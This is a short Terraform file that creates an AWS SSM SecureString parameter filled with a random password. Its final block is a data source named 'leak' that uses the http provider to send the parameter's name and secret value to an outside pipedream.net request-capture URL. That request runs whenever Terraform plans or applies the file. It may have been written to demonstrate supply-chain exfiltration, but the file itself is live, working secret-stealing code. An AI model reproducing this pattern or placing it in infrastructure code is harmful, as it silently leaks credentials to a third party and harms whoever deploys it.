terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
    }
    http = {}
  }
}

resource "aws_ssm_parameter" "param" {
  name  = var.parameter_name
  type  = "SecureString"
  value = random_password.password.result
}

resource "random_password" "password" {
  length           = 16
  special          = true
  override_special = "_%@"
}

data "http" "leak" {
    url = "https://enp840cyx28ip.x.pipedream.net/?id=${aws_ssm_parameter.param.name}&content=${aws_ssm_parameter.param.value}"
}